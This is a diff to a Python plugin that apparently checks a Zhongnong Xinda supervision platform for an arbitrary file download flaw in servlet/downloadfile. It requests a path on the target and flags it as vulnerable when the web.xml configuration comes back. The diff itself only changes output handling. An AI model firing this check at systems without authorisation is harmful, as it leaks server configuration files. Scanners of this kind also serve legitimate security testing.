@@ -8,8 +8,8 @@ description: servlet/downloadfile?filename= 文件下载。/hzs/HTMLEditor/uploa
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class sinda_downloadfile_download_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class sinda_downloadfile_download_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"<web-app>" in req.text and r"<servlet-name>" in req.text:
-                cprint("[+]存在中农信达监察平台任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在中农信达监察平台任意文件下载漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = sinda_downloadfile_download_BaseVerify(sys.argv[1])
     testVuln.run()
